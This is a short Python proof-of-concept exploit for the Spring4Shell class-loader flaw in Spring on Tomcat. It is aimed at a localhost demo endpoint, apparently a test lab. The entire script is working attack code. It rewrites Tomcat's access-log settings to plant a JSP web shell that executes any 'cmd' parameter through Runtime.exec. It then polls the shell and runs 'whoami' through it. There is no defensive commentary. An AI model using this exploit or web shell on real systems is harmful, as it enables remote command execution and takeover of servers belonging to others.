import time

import requests

payload = {
    "class.module.classLoader.resources.context.parent.pipeline.first.pattern": '%{c2}i { java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %{suffix}i',
    "class.module.classLoader.resources.context.parent.pipeline.first.suffix": ".jsp",
    "class.module.classLoader.resources.context.parent.pipeline.first.directory": "webapps/ROOT",
    "class.module.classLoader.resources.context.parent.pipeline.first.prefix": "tomcatwar",
    "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat": "",
}

if __name__ == "__main__":
    go = requests.post(
        "http://localhost:8080/demo/index",
        headers={"suffix": "%>//", "c2": "<%"},
        data=payload,
        timeout=15,
        allow_redirects=False,
        verify=False,
    )

    print("deploy", go)

    for i in range(60):
        shellgo = requests.get(
            "http://localhost:8080/tomcatwar.jsp",
            timeout=15,
            allow_redirects=False,
            verify=False,
        )

        print("webshell", shellgo)
        if shellgo.status_code == 500:
            print("webshell", "http://localhost:8080/tomcatwar.jsp?cmd=whoami")
            print(
                requests.get(
                    "http://localhost:8080/tomcatwar.jsp?cmd=whoami",
                    timeout=15,
                    allow_redirects=False,
                    verify=False,
                ).text[:20]
            )
            break

        time.sleep(1)
